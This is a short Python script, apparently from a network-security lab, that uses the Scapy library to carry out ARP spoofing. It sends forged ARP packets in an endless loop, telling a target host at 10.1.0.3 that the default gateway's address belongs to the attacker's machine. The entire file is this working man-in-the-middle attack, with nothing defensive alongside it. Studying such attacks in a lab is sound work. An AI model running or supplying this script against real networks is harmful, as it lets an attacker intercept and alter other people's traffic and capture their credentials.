from scapy.all import *

target_ip   = '10.1.0.3'
target_mac  = '0a:f7:e7:25:5c:2c' #Changes on each reboot
defgw_ip    = '10.1.0.1'

#Send ARP packet saying that the MAC Address correspondent of the default gateway is the attacker's
ether   = Ether(dst=target_mac)
arp     = ARP(
        op='who-has',
        psrc=defgw_ip,
        pdst=target_ip,
)

sendp(ether/arp, inter=0.2, loop=1)
